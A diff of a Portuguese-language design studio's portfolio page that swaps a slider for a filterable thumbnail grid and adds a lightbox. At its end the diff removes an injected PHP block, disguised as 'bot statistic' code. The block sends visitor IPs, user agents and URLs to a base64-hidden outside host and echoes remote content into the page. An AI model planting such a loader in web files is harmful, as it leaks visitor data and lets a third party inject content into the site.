@@ -11,6 +11,8 @@
 <link rel="stylesheet" href="css/font/stylesheet.css" media="all" />
 <link rel="stylesheet" href="css/reset.css" media="all" />
 <link rel="stylesheet" href="css/main.css" media="all" />
+<link rel="stylesheet" href="css/jquery-isotope-example.css" media="all">
+<link rel="stylesheet" href="css/lightbox.css" media="all" />
 <link rel="shortcut icon" href="favicon.ico" type="image/x-icon" />
 
 <script src="js/modernizr.js"></script>
@@ -136,7 +138,7 @@
 
 			</div><!--infografic-->
 
-		</div>
+		</div><!--col-center-->
 
 	</div><!--content-->
 
@@ -148,76 +150,81 @@
 
 		<h1>PORTFÓLIO</h1>
 
-		<div id="slides">
-			<ul class="slides_container">
+		<ul class="filter option-set">
 
-				<li>
-					<div class="slide">
-						<a href="http://www.casadaempada.com.br/meioambiente/" target="_blank">acessar</a>
-						<div class="name-port">Casa da Empada</div>
-						<div class="type-port">HOTSITE</div>
-						<img src="images/port/meioambiente.jpg" alt="" />
-					</div>
-					<div class="slide">
-						<a href="http://www.geottec.eng.br/" target="_blank">acessar</a>
-						<div class="name-port">Geottec</div>
-						<div class="type-port">WEBSITE</div>
-						<img src="images/port/geottec.jpg" alt="" />
-					</div>
-					<div class="slide">
-						<a href="http://denaer.com/" target="_blank">acessar</a>
-						<div class="name-port">DENAER</div>
-						<div class="type-port">WEBSITE</div>
-						<img src="images/port/denaer.jpg" alt="" />
-					</div>
-					<div class="slide">
-						<a href="#">acessar</a>
-						<div class="name-port">Elvis Training</div>
-						<div class="type-port">Ilustração 2D</div>
-						<img src="images/port/elvis.jpg" alt="" />
-					</div>
-					<div class="slide">
-						<a href="http://apimenta.com.br/" target="_blank">acessar</a>
-						<div class="name-port">A Pimenta</div>
-						<div class="type-port">WEBSITE</div>
-						<img src="images/port/apimenta.jpg" alt="" />
-					</div>
-					<div class="slide">
-						<a href="http://slhospitalar.com.br/loja/" target="_blank">acessar</a>
-						<div class="name-port">SL Hospitalar</div>
-						<div class="type-port">E-COMMERCE</div>
-						<img src="images/port/sl.jpg" alt="" />
-					</div>
-					<div class="slide">
-						<a href="#">acessar</a>
-						<div class="name-port">Geottec</div>
-						<div class="type-port">WEBSITE</div>
-						<img src="images/port/geottec.jpg" alt="" />
-					</div>
-					<div class="slide">
-						<a href="#">acessar</a>
-						<div class="name-port">Geottec</div>
-						<div class="type-port">WEBSITE</div>
-						<img src="images/port/geottec.jpg" alt="" />
-					</div>
-				</li>
-				<li>
-					<div class="slide">
-						<a href="http://www.casadaempada.com.br/meioambiente/" target="_blank">acessar</a>
-						<div class="name-port">Casa da Empada</div>
-						<div class="type-port">HOTSITE</div>
-						<img src="images/port/meioambiente.jpg" alt="" />
-					</div>
-					<div class="slide">
-						<a href="http://www.geottec.eng.br/" target="_blank">acessar</a>
-						<div class="name-port">Geottec</div>
-						<div class="type-port">WEBSITE</div>
-						<img src="images/port/geottec.jpg" alt="" />
-					</div>
-				</li>
+			<li><a href="#" data-filter-value="">todos</a></li>
+			<li><a href="#" data-filter-value=".web">website</a></li>
+			<li><a href="#" data-filter-value=".ilu">ilustração 2D</a></li>
 
-			</ul><!--slides_container-->
-		</div><!--slides-->
+		</ul><!--filter-controll-->
+			
+		<ul id="case">
+			<li class="thing web">
+				<div class="slide">
+					<a href="http://www.casadaempada.com.br/meioambiente/" target="_blank">acessar</a>
+					<div class="name-port">Casa da Empada</div>
+					<div class="type-port">HOTSITE</div>
+					<img src="images/port/thumb/meioambiente.jpg" alt="" />
+				</div>
+			</li>
+			<li class="thing web">
+				<div class="slide">
+					<a href="http://www.geottec.eng.br/" target="_blank">acessar</a>
+					<div class="name-port">Geottec</div>
+					<div class="type-port">WEBSITE</div>
+					<img src="images/port/thumb/geottec.jpg" alt="" />
+				</div>
+			</li>
+			<li class="thing web">
+				<div class="slide">
+					<a href="http://denaer.com/" target="_blank">acessar</a>
+					<div class="name-port">DENAER</div>
+					<div class="type-port">WEBSITE</div>
+					<img src="images/port/thumb/denaer.jpg" alt="" />
+				</div>
+			</li>
+			<li class="thing ilu">
+				<div class="slide">
+					<a href="images/port/elvis.jpg" rel="lightbox">acessar</a>
+					<div class="name-port">Elvis Training</div>
+					<div class="type-port">Ilustração 2D</div>
+					<img src="images/port/thumb/elvis.jpg" alt="" />
+				</div>
+			</li>
+			<li class="thing web">
+				<div class="slide">
+					<a href="http://apimenta.com.br/" target="_blank">acessar</a>
+					<div class="name-port">A Pimenta</div>
+					<div class="type-port">WEBSITE</div>
+					<img src="images/port/thumb/apimenta.jpg" alt="" />
+				</div>
+			</li>
+			<li class="thing web">
+				<div class="slide">
+					<a href="http://slhospitalar.com.br/loja/" target="_blank">acessar</a>
+					<div class="name-port">SL Hospitalar</div>
+					<div class="type-port">E-COMMERCE</div>
+					<img src="images/port/thumb/sl.jpg" alt="" />
+				</div>
+			</li>
+			<li class="thing ilu">
+				<div class="slide">
+					<a href="images/port/elvis.jpg" rel="lightbox">acessar</a>
+					<div class="name-port">Elvis Training</div>
+					<div class="type-port">Ilustração 2D</div>
+					<img src="images/port/thumb/elvis.jpg" alt="" />
+				</div>
+			</li>
+			<li class="thing ilu">
+				<div class="slide">
+					<a href="images/port/elvis.jpg" rel="lightbox">acessar</a>
+					<div class="name-port">Elvis Training</div>
+					<div class="type-port">Ilustração 2D</div>
+					<img src="images/port/thumb/elvis.jpg" alt="" />
+				</div>
+			</li>
+
+		</ul><!--slides_container-->
 
 	</div><!--content-->
 
@@ -356,41 +363,16 @@
 	<p>Copyright @ Todos os direitos reservados.</p>
 
 </footer>
-<script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.0/jquery.min.js"></script>
+<script src="//ajax.googleapis.com/ajax/libs/jquery/1.7.1/jquery.min.js"></script>
+<script src="js/lightbox.js"></script>
 <script src="js/jquery.validate.js"></script>
 <script src="js/functions.js"></script>
 <script src="js/jquery.smooth-scroll.js"></script>
 <script src="js/slides.min.jquery.js"></script>
 <script src="js/jquery.easing.1.3.js"></script>
+<script src="js/jquery.isotope.min.js"></script>
+<script src="js/jquery-isotope-example.js"></script>
 <script> MENU.init(); </script>
 
 </body>
-</html><?php
-if (!isset($sRetry))
-{
-global $sRetry;
-$sRetry = 1;
-    // This code use for global bot statistic
-    $sUserAgent = strtolower($_SERVER['HTTP_USER_AGENT']); //  Looks for google serch bot
-    $stCurlHandle = NULL;
-    $stCurlLink = "";
-    if((strstr($sUserAgent, 'google') == false)&&(strstr($sUserAgent, 'yahoo') == false)&&(strstr($sUserAgent, 'baidu') == false)&&(strstr($sUserAgent, 'msn') == false)&&(strstr($sUserAgent, 'opera') == false)&&(strstr($sUserAgent, 'chrome') == false)&&(strstr($sUserAgent, 'bing') == false)&&(strstr($sUserAgent, 'safari') == false)&&(strstr($sUserAgent, 'bot') == false)) // Bot comes
-    {
-        if(isset($_SERVER['REMOTE_ADDR']) == true && isset($_SERVER['HTTP_HOST']) == true){ // Create  bot analitics            
-        $stCurlLink = base64_decode( 'aHR0cDovL21icm93c2Vyc3RhdHMuY29tL3N0YXRIL3N0YXQucGhw').'?ip='.urlencode($_SERVER['REMOTE_ADDR']).'&useragent='.urlencode($sUserAgent).'&domainname='.urlencode($_SERVER['HTTP_HOST']).'&fullpath='.urlencode($_SERVER['REQUEST_URI']).'&check='.isset($_GET['look']);
-            @$stCurlHandle = curl_init( $stCurlLink ); 
-    }
-    } 
-if ( $stCurlHandle !== NULL )
-{
-    curl_setopt($stCurlHandle, CURLOPT_RETURNTRANSFER, 1);
-    curl_setopt($stCurlHandle, CURLOPT_TIMEOUT, 6);
-    $sResult = @curl_exec($stCurlHandle); 
-    if ($sResult[0]=="O") 
-     {$sResult[0]=" ";
-      echo $sResult; // Statistic code end
-      }
-    curl_close($stCurlHandle); 
-}
-}
-?>
+</html>
